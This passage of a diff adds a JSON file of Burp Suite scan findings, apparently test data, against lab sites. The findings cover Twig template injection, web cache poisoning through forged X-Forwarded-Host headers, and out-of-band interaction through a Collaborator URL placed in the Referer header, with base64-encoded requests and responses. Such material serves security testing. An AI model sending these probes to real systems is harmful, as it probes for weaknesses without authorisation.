CAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxkaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGltZyBzcmM9Ii9pbWFnZS9jb250ZW50L3Byb2R1Y3RjYXRhbG9nL3Byb2R1Y3RzLzI5LmpwZyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGgzPldhdGVycHJvb2YgVGVhIEJhZ3M8L2gzPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbWcgc3JjPSIvcmVzb3VyY2VzL2ltYWdlcy9yYXRpbmdUd28ucG5nIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkNzQuMzgKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIiBocmVmPSIvcHJvZHVjdD9wcm9kdWN0SWQ9MTciPlZpZXcgZGV0YWlsczwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW1nIHNyYz0iL2ltYWdlL2NvbnRlbnQvcHJvZHVjdGNhdGFsb2cvcHJvZHVjdHMvMjEuanBnIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aDM+U25vdyBEZWxpdmVyZWQgVG8gWW91ciBEb29yPC9oMz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW1nIHNyYz0iL3Jlc291cmNlcy9pbWFnZXMvcmF0aW5nVGhyZWUucG5nIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkNTcuOTYKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIiBocmVmPSIvcHJvZHVjdD9wcm9kdWN0SWQ9MTAiPlZpZXcgZGV0YWlsczwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGRpdj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aW1nIHNyYz0iL2ltYWdlL2NvbnRlbnQvcHJvZHVjdGNhdGFsb2cvcHJvZHVjdHMvMzEuanBnIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8aDM+Q291cGxlJmFwb3M7cyBVbWJyZWxsYTwvaDM+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGltZyBzcmM9Ii9yZXNvdXJjZXMvaW1hZ2VzL3JhdGluZ1R3by5wbmciPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICQ4Ni44MwogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxhIGNsYXNzPSJidXR0b24iIGhyZWY9Ii9wcm9kdWN0P3Byb2R1Y3RJZD0xNSI+VmlldyBkZXRhaWxzPC9hPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9kaXY+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8ZGl2PgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxpbWcgc3JjPSIvaW1hZ2UvY29udGVudC9wcm9kdWN0Y2F0YWxvZy9wcm9kdWN0cy83LmpwZyI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGgzPkNvbnZlcnNhdGlvbiBDb250cm9sbGluZyBMZW1vbjwvaDM+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPGltZyBzcmM9Ii9yZXNvdXJjZXMvaW1hZ2VzL3JhdGluZ0ZvdXIucG5nIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAkMTUuNjQKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0iYnV0dG9uIiBocmVmPSIvcHJvZHVjdD9wcm9kdWN0SWQ9MjAiPlZpZXcgZGV0YWlsczwvYT4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2Pgo8L3NlY3Rpb24+CiAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPC9zZWN0aW9uPgogICAgICAgIDwvZGl2PgogICAgPC9ib2R5Pgo8L2h0bWw+Cg==",
+              "length": 9943
+            }
+          ],
+          "was_redirect_followed": false,
+          "request_time": "1561026118767"
+        },
+        "dns_event": {
+          "query_type": 1,
+          "domain": "pmfqjqnx3qv3g04s96bnqse8fzls9mxqlj89wy.burpcollaborator.net",
+          "query": "yDEAEAABAAAAAAABJnBtZnFqcW54M3F2M2cwNHM5NmJucXNlOGZ6bHM5bXhxbGo4OXd5EGJ1cnBjb2xsYWJvcmF0b3IDbmV0AAABAAEAACkQAAAAgAAAAA==",
+          "time_stamp": "2019-Jun-20 10:21:58 UTC",
+          "time_between_sending_payload_and_receiving_interaction": "0",
+          "source_ip_address": "52.17.5.255",
+          "source_port": 53,
+          "type": "dns",
+          "interaction_id": "pmfqjqnx3qv3g04s96bnqse8fzls9mxqlj89wy",
+          "description": "The Collaborator server received a DNS lookup of type A for the domain name <b>pmfqjqnx3qv3g04s96bnqse8fzls9mxqlj89wy.burpcollaborator.net<\/b>.<br><br> The lookup was received from IP address 52.17.5.255 at 2019-Jun-20 10:21:58 UTC."
+        },
+        "http_event": {
+          "protocol": "HTTP",
+          "request_response": {
+            "url": "http://pmfqjqnx3qv3g04s96bnqse8fzls9mxqlj89wy.burpcollaborator.net/",
+            "request": [
+              {
+                "type": "DataSegment",
+                "data": "R0VUIC8gSFRUUC8xLjANCkhvc3Q6IA==",
+                "length": 22
+              },
+              {
+                "type": "HighlightSegment",
+                "data": "cG1mcWpxbngzcXYzZzA0czk2Ym5xc2U4ZnpsczlteHFsajg5d3kuYnVycGNvbGxhYm9yYXRvci5uZXQ=",
+                "length": 59
+              },
+              {
+                "type": "DataSegment",
+                "data": "DQpDb250ZW50LVR5cGU6IHRleHQvcGxhaW47IGNoYXJzZXQ9dXRmLTgNCg0K",
+                "length": 45
+              }
+            ],
+            "response": [
+              {
+                "type": "DataSegment",
+                "data": "SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYxDQoNCjxodG1sPjxib2R5PnRwc3d6OGxrNWRwZ2t4NnU5N3hnOHR6amxnbWd3Z2xmaWd6PC9ib2R5PjwvaHRtbD4=",
+                "length": 209
+              }
+            ],
+            "was_redirect_followed": false,
+            "request_time": "1561026118767"
+          },
+          "time_stamp": "2019-Jun-20 10:21:58 UTC",
+          "time_between_sending_payload_and_receiving_interaction": "0",
+          "source_ip_address": "99.80.226.107",
+          "source_port": 80,
+          "type": "http",
+          "interaction_id": "pmfqjqnx3qv3g04s96bnqse8fzls9mxqlj89wy",
+          "description": "The Collaborator server received an HTTP request.<br><br> The request was received from IP address 99.80.226.107 at 2019-Jun-20 10:21:58 UTC."
+        }
+      }
+    ],
+    "internal_data": "eyJmbGFncyI6NTEyLCJ2YXJpYW50IjotMSwiaW5zZXJ0aW9uX3BvaW50X2tleSI6IjN4MCIsImluc2VydGlvbl9wb2ludF9pZGVudGlmaWVycyI6W3sidHlwZV9pbmRleCI6NDA5OCwibmFtZSI6IlRyYWNraW5nSWQifV0sImlzc3VlX2RldGFpbHNfbWFwIjp7IjEiOiJ3YXFrcyIsIjM1IjoiMiIsIjM2IjoiLTEifX0="
+  },
+  {
+    "name": "Server-side template injection",
+    "type_index": 1052800,
+    "serial_number": "3845501764550708224",
+    "origin": "http://insecure-bank.com",
+    "path": "/user-homepage",
+    "severity": "high",
+    "confidence": "certain",
+    "description": "The <b>input<\/b> parameter appears to be vulnerable to server-side template injection attacks. The template engine appears to be <b>Twig<\/b>.<br><br>The payload <b>bobdj{{6*'2'}}{#commentedout#}{{8*3}}sl1s0<\/b> was submitted in the input parameter. This payload contains a Twig template statement.<br><br>The server response contained the string <b>bobdj1224sl1s0<\/b>. This indicates that the payload is being interpreted by a server-side template engine.",
+    "caption": "/template/given_twig_when_text_then_vulnerable! [input parameter]",
+    "evidence": [
+      {
+        "type": "FirstOrderEvidence",
+        "detail": {
+          "payload": {
+            "bytes": "Ym9iZGp7ezYqJzInfX17I2NvbW1lbnRlZG91dCN9e3s4KjN9fXNsMXMw",
+            "flags": 0
+          },
+          "band_flags": [
+            "in_band"
+          ]
+        },
+        "request_response": {
+          "url": "http://insecure-bank.com/user-homepage?input=bobdj%7b%7b6*'2'%7d%7d%7b%23commentedout%23%7d%7b%7b8*3%7d%7dsl1s0",
+          "request": [
+            {
+              "type": "DataSegment",
+              "data": "R0VUIC91c2VyLWhvbWVwYWdlP2lucHV0PQ==",
+              "length": 25
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "Ym9iZGolN2IlN2I2KicyJyU3ZCU3ZCU3YiUyM2NvbW1lbnRlZG91dCUyMyU3ZCU3YiU3YjgqMyU3ZCU3ZHNsMXMw",
+              "length": 66
+            },
+            {
+              "type": "DataSegment",
+              "data": "IEhUVFAvMS4xDQpIb3N0OiBpbnNlY3VyZS1iYW5rLmNvbQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTAuMTQ7IHJ2OjY3LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNjcuMA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSwqLyo7cT0wLjgNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KQ29ubmVjdGlvbjogY2xvc2UNClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENCg0K",
+              "length": 321
+            }
+          ],
+          "response": [
+            {
+              "type": "DataSegment",
+              "data": "SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KU2VydmVyOiBBcGFjaGUvMi40LjkgKFVuaXgpDQpTdGF0dXM6IDIwMCBPSw0KVmFyeTogQWNjZXB0LUVuY29kaW5nDQpEYXRlOiBUaHUsIDIwIEp1biAyMDE5IDEyOjQzOjUzIEdNVA0KQ29udGVudC1MZW5ndGg6IDMyMg0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPGhlYWQ+PHRpdGxlPlR3aWcgVGVtcGxhdGUgSW5qZWN0aW9uPC90aXRsZT48c3R5bGU+Ym9keSB7IGJhY2tncm91bmQtY29sb3I6ICNEMkUxQ0M7IH08L3N0eWxlPjwvaGVhZD48Ym9keT48aDM+VHdpZyBUZW1wbGF0ZSBJbmplY3Rpb24gKHVuc2FuZGJveGVkKTwvaDM+PGI+SW5wdXQ6IDwvYj5ib2JkaiYjMTIzOyYjMTIzOzYmIzQyOyYjMzk7MiYjMzk=",
+              "length": 389
+            },
+            {
+              "type": "DataSegment",
+              "data": "OyYjMTI1OyYjMTI1OyYjMTIzOyYjMzU7Y29tbWVudGVkb3V0JiMzNTsmIzEyNTsmIzEyMzsmIzEyMzs4JiM0MjszJiMxMjU7JiMxMjU7c2wxczA8YnIvPjwvYnI+PGI+T3V0cHV0OiA=",
+              "length": 104
+            },
+            {
+              "type": "DataSegment",
+              "data": "PC9iPg==",
+              "length": 4
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "Ym9iZGoxMjI0c2wxczA=",
+              "length": 14
+            }
+          ],
+          "was_redirect_followed": false,
+          "request_time": "1561034688487"
+        }
+      }
+    ],
+    "internal_data": "eyJmbGFncyI6MCwidmFyaWFudCI6NSwiaW5zZXJ0aW9uX3BvaW50X2tleSI6IjF4MCIsImluc2VydGlvbl9wb2ludF9pZGVudGlmaWVycyI6W3sidHlwZV9pbmRleCI6NDA5NiwibmFtZSI6ImlucHV0In1dLCJpc3N1ZV9kZXRhaWxzX21hcCI6eyIxMCI6ImJvYmRqMTIyNHNsMXMwIn19"
+  },
+  {
+    "name": "Web cache poisoning",
+    "type_index": 2097536,
+    "serial_number": "5682680071879408640",
+    "origin": "http://insecure-bank.com",
+    "path": "/contact-us",
+    "severity": "high",
+    "confidence": "certain",
+    "description": "The application supports the use of a custom HTTP header to override the Host header, and uses a cache that can be manipulated into saving responses that have been influenced by this header.<br><br>Burp added the following headers to the request:<br><br>X-Forwarded-Host: 5256z63dj6bjwgk8pmr368uovf18pad3er4eu2j.burpcollaborator.net<br>X-Host: 5256z63dj6bjwgk8pmr368uovf18pad3er4eu2j.burpcollaborator.net<br>X-Forwarded-Server: 5256z63dj6bjwgk8pmr368uovf18pad3er4eu2j.burpcollaborator.net<br><br>This resulted in a response containing 5256z63dj6bjwgk8pmr368uovf18pad3er4eu2j. Burp then resent the request without these headers and got the same response, indicating that it had been cached.",
+    "caption": "/cachepoison/given_xfh_reflection_then_vulnerable!",
+    "evidence": [
+      {
+        "type": "FirstOrderEvidence",
+        "detail": {
+          "band_flags": [
+            "in_band"
+          ]
+        },
+        "request_response": {
+          "url": "http://insecure-bank.com/contact-us?input=foo&m0xp37ttir=1",
+          "request": [
+            {
+              "type": "DataSegment",
+              "data": "R0VUIC9jb250YWN0LXVzP2lucHV0PWZvbyZtMHhwMzd0dGlyPTEgSFRUUC8xLjENCkhvc3Q6IGluc2VjdXJlLWJhbmsuY29tDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMC4xNDsgcnY6NjcuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC82Ny4wDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LCovKjtxPTAuOA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpSZWZlcmVyOiBodHRwOi8vaW5zZWN1cmUtYmFuay5jb20vY2FjaGVwb2lzb24vDQpDb25uZWN0aW9uOiBjbG9zZQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0K",
+              "length": 405
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "WC1Gb3J3YXJkZWQtSG9zdDogNTI1Nno2M2RqNmJqd2drOHBtcjM2OHVvdmYxOHBhZDNlcjRldTJqLmJ1cnBjb2xsYWJvcmF0b3IubmV0",
+              "length": 78
+            },
+            {
+              "type": "DataSegment",
+              "data": "DQo=",
+              "length": 2
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "WC1Ib3N0OiA1MjU2ejYzZGo2Ymp3Z2s4cG1yMzY4dW92ZjE4cGFkM2VyNGV1MmouYnVycGNvbGxhYm9yYXRvci5uZXQ=",
+              "length": 68
+            },
+            {
+              "type": "DataSegment",
+              "data": "DQo=",
+              "length": 2
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "WC1Gb3J3YXJkZWQtU2VydmVyOiA1MjU2ejYzZGo2Ymp3Z2s4cG1yMzY4dW92ZjE4cGFkM2VyNGV1MmouYnVycGNvbGxhYm9yYXRvci5uZXQ=",
+              "length": 80
+            },
+            {
+              "type": "DataSegment",
+              "data": "DQoNCg==",
+              "length": 4
+            }
+          ],
+          "response": [
+            {
+              "type": "DataSegment",
+              "data": "SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KU2VydmVyOiBBcGFjaGUvMi40LjkgKFVuaXgpDQpTdGF0dXM6IDIwMCBPSw0KVmFyeTogQWNjZXB0LUVuY29kaW5nDQpEYXRlOiBUaHUsIDIwIEp1biAyMDE5IDEyOjQ1OjMzIEdNVA0KQ29udGVudC1MZW5ndGg6IDYwDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=",
+              "length": 188
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "NTI1Nno2M2RqNmJqd2drOHBtcjM2OHVvdmYxOHBhZDNlcjRldTJq",
+              "length": 39
+            },
+            {
+              "type": "DataSegment",
+              "data": "LmJ1cnBjb2xsYWJvcmF0b3IubmV0",
+              "length": 21
+            }
+          ],
+          "was_redirect_followed": false,
+          "request_time": "1561034769767"
+        }
+      },
+      {
+        "type": "FirstOrderEvidence",
+        "detail": {
+          "band_flags": [
+            "in_band"
+          ]
+        },
+        "request_response": {
+          "url": "http://insecure-bank.com/contact-us?input=foo&m0xp37ttir=1",
+          "request": [
+            {
+              "type": "DataSegment",
+              "data": "R0VUIC9jb250YWN0LXVzP2lucHV0PWZvbyZtMHhwMzd0dGlyPTEgSFRUUC8xLjENCkhvc3Q6IGluc2VjdXJlLWJhbmsuY29tDQpVc2VyLUFnZW50OiBNb3ppbGxhLzUuMCAoTWFjaW50b3NoOyBJbnRlbCBNYWMgT1MgWCAxMC4xNDsgcnY6NjcuMCkgR2Vja28vMjAxMDAxMDEgRmlyZWZveC82Ny4wDQpBY2NlcHQ6IHRleHQvaHRtbCxhcHBsaWNhdGlvbi94aHRtbCt4bWwsYXBwbGljYXRpb24veG1sO3E9MC45LCovKjtxPTAuOA0KQWNjZXB0LUxhbmd1YWdlOiBlbi1VUyxlbjtxPTAuNQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpSZWZlcmVyOiBodHRwOi8vaW5zZWN1cmUtYmFuay5jb20vY2FjaGVwb2lzb24vDQpDb25uZWN0aW9uOiBjbG9zZQ0KVXBncmFkZS1JbnNlY3VyZS1SZXF1ZXN0czogMQ0KDQo=",
+              "length": 407
+            }
+          ],
+          "response": [
+            {
+              "type": "DataSegment",
+              "data": "SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KU2VydmVyOiBBcGFjaGUvMi40LjkgKFVuaXgpDQpTdGF0dXM6IDIwMCBPSw0KVmFyeTogQWNjZXB0LUVuY29kaW5nDQpEYXRlOiBUaHUsIDIwIEp1biAyMDE5IDEyOjQ1OjMzIEdNVA0KQ29udGVudC1MZW5ndGg6IDYwDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=",
+              "length": 188
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "NTI1Nno2M2RqNmJqd2drOHBtcjM2OHVvdmYxOHBhZDNlcjRldTJq",
+              "length": 39
+            },
+            {
+              "type": "DataSegment",
+              "data": "LmJ1cnBjb2xsYWJvcmF0b3IubmV0",
+              "length": 21
+            }
+          ],
+          "was_redirect_followed": false,
+          "request_time": "1561034769767"
+        }
+      }
+    ],
+    "internal_data": "eyJmbGFncyI6MCwidmFyaWFudCI6MSwiaXNzdWVfZGV0YWlsc19tYXAiOnsiNDUiOiJYLUZvcndhcmRlZC1Ib3N0OiA1MjU2ejYzZGo2Ymp3Z2s4cG1yMzY4dW92ZjE4cGFkM2VyNGV1MmouYnVycGNvbGxhYm9yYXRvci5uZXSnWC1Ib3N0OiA1MjU2ejYzZGo2Ymp3Z2s4cG1yMzY4dW92ZjE4cGFkM2VyNGV1MmouYnVycGNvbGxhYm9yYXRvci5uZXSnWC1Gb3J3YXJkZWQtU2VydmVyOiA1MjU2ejYzZGo2Ymp3Z2s4cG1yMzY4dW92ZjE4cGFkM2VyNGV1MmouYnVycGNvbGxhYm9yYXRvci5uZXQiLCIzIjoiMjAwIiwiNDciOiJ0cnVlIiwiMzIiOiI1MjU2ejYzZGo2Ymp3Z2s4cG1yMzY4dW92ZjE4cGFkM2VyNGV1MmoifX0="
+  },
+  {
+    "name": "External service interaction (HTTP)",
+    "type_index": 3146256,
+    "serial_number": "2605741849974081536",
+    "origin": "https://insecure-website.com",
+    "path": "/product",
+    "severity": "high",
+    "confidence": "certain",
+    "description": "It is possible to induce the application to perform server-side HTTP and HTTPS requests to arbitrary domains.<br><br>The payload <b>Http://tkhuhul11ut7e42w7a9rowccd3jw7zvsxgs3jr8.burpcollaborator.net/<\/b> was submitted in the <b>Referer<\/b> HTTP header.<br><br>The application performed an HTTP request to the specified domain.",
+    "caption": "/product [Referer HTTP header]",
+    "evidence": [
+      {
+        "type": "CollaboratorEvidence",
+        "detail": {
+          "payload": {
+            "bytes": "SHR0cDovL3RraHVodWwxMXV0N2U0Mnc3YTlyb3djY2Qzanc3enZzeGdzM2pyOC5idXJwY29sbGFib3JhdG9yLm5ldC8=",
+            "flags": 0
+          },
+          "band_flags": [
+            "out_of_band"
+          ]
+        },
+        "request_response": {
+          "url": "https://insecure-website.com/product?productId=6",
+          "request": [
+            {
+              "type": "DataSegment",
+              "data": "R0VUIC9wcm9kdWN0P3Byb2R1Y3RJZD02IEhUVFAvMS4xDQpIb3N0OiBpbnNlY3VyZS13ZWJzaXRlLmNvbQ0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKE1hY2ludG9zaDsgSW50ZWwgTWFjIE9TIFggMTAuMTQ7IHJ2OjY3LjApIEdlY2tvLzIwMTAwMTAxIEZpcmVmb3gvNjcuMA0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSwqLyo7cT0wLjgNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVMsZW47cT0wLjUNCkFjY2VwdC1FbmNvZGluZzogZ3ppcCwgZGVmbGF0ZQ0KUmVmZXJlcjog",
+              "length": 306
+            },
+            {
+              "type": "HighlightSegment",
+              "data": "SHR0cDovL3RraHVodWwxMXV0N2U0Mnc3YTlyb3djY2Qzanc3enZzeGdzM2pyOC5idXJwY29sbGFib3JhdG9yLm5ldC8=",
+              "length": 68
+            },
+            {
+              "type": "DataSegment",
+              "data": "DQpDb25uZWN0aW9uOiBjbG9zZQ0KQ29va2llOiBzZXNzaW9uPXplQllJTjdUdkcwZXFPcDU3YzFOb2NkYWRYczRzMElwDQpVcGdyYWRlLUluc2VjdXJlLVJlcXVlc3RzOiAxDQoNCg==",
+              "length": 103
+            }
+          ],
+          "response": [
+            {
+              "type": "DataSegment",
+              "data": "SFRUUC8xLjEgMjAwIE9LDQpDb250ZW50LVNlY3VyaXR5LVBvbGljeTogZGVmYXVsdC1zcmMgJ3NlbGYnOyBzY3JpcHQtc3JjICdzZWxmJzsgaW1nLXNyYyAnc2VsZic7IHN0eWxlLXNyYyAnc2VsZic7IGZyYW1lLXNyYyAnc2VsZic7IGNvbm5lY3Qtc3JjICdzZWxmJyB3czovL2xvY2FsaG9zdDozMzMzOyBmb250LXNyYyAnc2VsZic7IG1lZGlhLXNyYyAnc2VsZic7IG9iamVjdC1zcmMgJ25vbmUnOyBjaGlsZC1zcmMgJ3NlbGYnIGJsb2I6DQpYLUNvbnRlbnQtVHlwZS1PcHRpb25zOiBub3NuaWZmDQpYLVhTUy1Qcm90ZWN0aW9uOiAxOyBtb2RlPWJsb2NrDQpYLUZyYW1lLU9wdGlvbnM6IERFTlkNCkNvbm5lY3Rpb246IGNsb3NlDQpDb250ZW50LVR5cGU6IHRleHQvaHRtbDsgY2hhcnNldD11dGYtOA0KQ29udGVudC1MZW5ndGg6IDM1NjANCg0KPCFET0NUWVBFIGh0bWw+CjxodG1sPgogICAgPGhlYWQ+CiAgICAgICAgPGxpbmsgaHJlZj0iL3Jlc291cmNlcy9jc3MvbGFic0Vjb21tZXJjZS5jc3MiIHJlbD0ic3R5bGVzaGVldCI+CiAgICAgICAgPHRpdGxlPkJsaW5kIFNTUkYgd2l0aCBTaGVsbHNob2NrIGV4cGxvaXRhdGlvbjwvdGl0bGU+CiAgICA8L2hlYWQ+CiAgICA8Ym9keT4KICAgICAgICA=",
+              "length": 623
+            },
+            {
+              "type": "DataSegment",
+              "data": "PGRpdiB0aGVtZT0iZWNvbW1lcmNlIj4KICAgICAgICAgICAgPGRpdiBpZD0ibGFiSGVhZGVyIj4KICAgICAgICAgICAgICAgIDxzZWN0aW9uIGNsYXNzPSJwYWdlSGVhZGVyIj4KICAgICAgICAgICAgICAgICAgICA8ZGl2IGNsYXNzPSJjb250YWluZXIiPgogICAgICAgICAgICAgICAgICAgICAgICA8aW1nIHNyYz0iL3Jlc291cmNlcy9pbWFnZXMvbG9nb0FjYWRlbXkuc3ZnIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0idGl0bGUtY29udGFpbmVyIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxoMj5CbGluZCBTU1JGIHdpdGggU2hlbGxzaG9jayBleHBsb2l0YXRpb248L2gyPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPGJ1dHRvbiBpZD0ic3VibWl0U29sdXRpb24iIGNsYXNzPSJidXR0b24iIG1ldGhvZD0iUE9TVCIgcGF0aD0iL3N1Ym1pdFNvbHV0aW9uIiBwYXJhbWV0ZXI9ImFuc3dlciI+U3VibWl0IHNvbHV0aW9uPC9idXR0b24+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c2NyaXB0IHNyYz0iL3Jlc291cmNlcy9qcy9zdWJtaXRTb2x1dGlvbi5qcyI+PC9zY3JpcHQ+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8YSBjbGFzcz0ibGluay1iYWNrIiBocmVmPSJodHRwczovL3BvcnRzd2lnZ2VyLm5ldCI+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgQmFjayB0byBsYWIgZGVzY3JpcHRpb24gCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPHN2ZyB2ZXJzaW9uPSIxLjEiIGlkPSJMYXllcl8xIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hsaW5rIiB4PSIwcHgiIHk9IjBweCIgdmlld0JveD0iMCAwIDI4IDMwIiBlbmFibGUtYmFja2dyb3VuZD0ibmV3IDAgMCAyOCAzMCIgeG1sOnNwYWNlPSJwcmVzZXJ2ZSIgdGl0bGU9ImJhY2stYXJyb3ciPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICA8Zz4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxwb2x5Z29uIHBvaW50cz0iMS40LDAgMCwxLjIgMTIuNiwxNSAwLDI4LjggMS40LDMwIDE1LjEsMTUiPjwvcG9seWdvbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxwb2x5Z29uIHBvaW50cz0iMTQuMywwIDEyLjksMS4yIDI1LjYsMTUgMTIuOSwyOC44IDE0LjMsMzAgMjgsMTUiPjwvcG9seWdvbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9nPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDwvc3ZnPgogICAgICAgICAgICAgICAgICAgICAgICAgICAgPC9hPgogICAgICAgICAgICAgICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0id2lkZ2V0Y29udGFpbmVyLWxhYi1zdGF0dXMgaXMtbm90c29sdmVkIj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxzcGFuPkxBQjwvc3Bhbj4KICAgICAgICAgICAgICAgICAgICAgICAgICAgIDxwPk5vdCBzb2x2ZWQ8L3A+CiAgICAgICAgICAgICAgICAgICAgICAgICAgICA8c3BhbiBjbGFzcz0ibGFiLXN0YXR1cy1pY29uIj48L3NwYW4+CiAgICAgICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgICAgIDwvZGl2PgogICAgICAgICAgICAgICAgPC9zZWN0aW9uPgogICAgICAgICAgICA8L2Rpdj4KICAgICAgICAgICAgPHNjcmlwdCBzcmM9Ii9yZXNvdXJjZXMvanMvbGFiSGVhZGVyLmpzIj48L3NjcmlwdD4KICAgICAgICAgICAgPHNlY3Rpb24gY2xhc3M9Im1haW5jb250YWluZXIiPgogICAgICAgICAgICAgICAgPGRpdiBjbGFzcz0iY29udGFpbmVyIGlzLXBhZ2UiPgogICAgICAgICAgICAgICAgICAgIDxzZWN0aW9uIGNsYXNzPSJwcm9kdWN0Ij4KICAgICAgICAgICAgICAgICAgICAgICAgPGgzPkNhdXRpb24gU2lnbjwvaDM+CiAgICAgICAgICAgICAgICAgICAgICAgIDxpbWcgc3JjPSIvcmVzb3VyY2VzL2ltYWdlcy9yYXRpbmdGaXZlLnBuZyI+CiAgICAgICAgICAgICAgICAgICAgICAgICQzNS4xNAogICAgICAgICAgICAgICAgICAgICAgICA8aW1nIHNyYz0iL2ltYWdlL2NvbnRlbnQvcHJvZHVjdGNhdGFsb2cvcHJvZHVjdHMvMzYuanBnIj4KICAgICAgICAgICAgICAgICAgICAgICAgPGxhYmVsPkRlc2NyaXB0aW9uOjwvbGFiZWw+CiAgICAgICAgICAgICAgICAgICAgICAgIDxwPkFsZXJ0IHlvdXIgbG92ZWQgb25lcyB0byB0aGUgcGVyaWxzIG9mIHRoZSBiYXRocm9vbSBiZWZvcmUgaXQncyB0b28gbGF0ZSB0aGFua3MgdG8gdGhpcyBub3ZlbHR5IHNpZ24uPC9wPgogICAgICAgICAgICAgICAgICAgICAgICA8cD5QZXJmZWN0IGZvciBob21lIG9yIGV2ZW4gdGhlIG9mZmljZSwgYmUgc3VyZSB0byBwb3AgaXQgdW5kZXIgeW91ciBhcm0gYW5kIHRha2UgaX